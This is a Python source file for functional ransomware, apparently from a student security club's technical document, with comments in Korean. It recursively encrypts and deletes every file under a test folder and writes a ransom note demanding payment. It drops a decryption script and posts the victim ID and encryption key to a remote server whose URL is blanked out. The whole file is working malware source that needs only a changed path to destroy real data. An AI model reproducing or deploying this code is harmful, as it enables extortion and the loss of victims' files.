import secrets
import base64
import os
import requests
from cryptography.fernet import Fernet
    
def main():
    encryption_key=generate_encryption_key()
    search_and_encrypt_files(encryption_key)
    
    your_id=make_id()
    create_and_display_ransom_note(your_id)
    send_key(f"{your_id} : {encryption_key.decode()}")
    
    if 1==0:
        print(f"생성된 key : {encryption_key.decode()}")
    exit(0)

def generate_encryption_key(length=32):
    """
    @breif : 암호화키를 생성하는 코드
    @param : 암호화키의 길이
    @return : param만큼의 문자열
    """
    secret_token=secrets.token_hex(length)
    byte_secret_token=bytes.fromhex(secret_token)
    encoded_key=base64.urlsafe_b64encode(byte_secret_token)
    
    return encoded_key


def search_and_encrypt_files(key):
    """
    @breif : 시스템 내 파일 탐색 및 암호화 실행
    @param : 생성된 암호화키
    @return : 성공과 실패 여부
    """

    def search_file(directory:str, *extension:tuple[str]):
        """
        @breif : 주어진 디렉토리 내에서 특정 확장자를 가진 모든 파일을 탐색합니다.
        @param directory : 탐색할 디렉토리의 경로
        @param extension : 찾고자 하는 파일의 확장자
        @return : 해당 확장자를 가진 모든 파일의 경로 목록
        """
        files_found = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if "all" in extension:
                    files_found.append(os.path.join(root, file))
                else:
                    if file.endswith(tuple(extension)):
                        files_found.append(os.path.join(root, file))
        return files_found
    
    def encrypt_file(filename):
        """
        @breif : AES256 방식으로 암호화하는 함수
        @param : 파일명
        @return : None
        """
        with open(filename,"rb") as target:
            cipher=Fernet(key)
            with open(filename+".hacked","wb") as locked_file:
                locked_file.write(cipher.encrypt(target.read()))
        os.remove(filename)
        return

    files=search_file("C:\\test","all")
    for file in files:
        encrypt_file(file)
    return


def create_and_display_ransom_note(id):
    """
    @breif : 사용자에게 요구사항을 알리는 랜섬노트 생성 및 표시
    @param : None
    @return : None
    """
    def __find_desktop_path__():
        # 바탕화면 경로를 찾는 함수
        home_dir = os.path.expanduser("~")
        desktop_dir = os.path.join(home_dir, 'Desktop')
        return desktop_dir
    
    __desktop_path__=__find_desktop_path__()
    ransom_note=__desktop_path__+"\\Readme.txt"
    decode_tool="DecodeTool.py"
    
    with open(ransom_note,"w+",encoding="utf-8") as f:
        message=f"""
당신의 컴퓨터는 해킹되었습니다.
keeper14기 강백준,이영재에게 돈을 입금하세요.
2024-01-08 keeper 기술문서
당신의 아이디 : {id}"""
        f.write(message)
        f.seek(0,0) # fseek(fp,0,SEEK_SET);
        print(f.read())
        
    with open(decode_tool,"w") as f:
        code="""
from cryptography.fernet import Fernet
import os

def search_file(directory:str, extension:list):
    files_found = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(extension)):
                files_found.append(os.path.join(root, file))
    return files_found

key = input("Input key\\n\\n").encode()
encrypted_files = search_file('C:\\\\test', ['.hacked'])

cipher = Fernet(key)
for encrypted_file in encrypted_files:
    decrypted_file = encrypted_file.replace('.hacked', '')

    with open(encrypted_file, "rb") as encrypted_target:
        decrypted_data = cipher.decrypt(encrypted_target.read())
        with open(decrypted_file, "wb") as decrypted_file_target:
            decrypted_file_target.write(decrypted_data)
    
    os.remove(encrypted_file)
    print(f"Decoded: {decrypted_file}")

print("Decode process completed.")
        """
        f.write(code)

    return

def make_id():
    """
    @brief : 복호화 협상을 시도할 아이디 생성
    @param : None
    @return : None
    """
    return secrets.token_hex(4)
    
def send_key(text):
    """
    @brief : 해커서버에 암호화키를 전송하는 함수
    @param : 전송할 메시지
    @return : None
    """
    url = "SECRET"
    data = {'message': text}
    response = requests.post(url, data=data)
    print(response.text)
    return

if __name__ == "__main__":
    main()
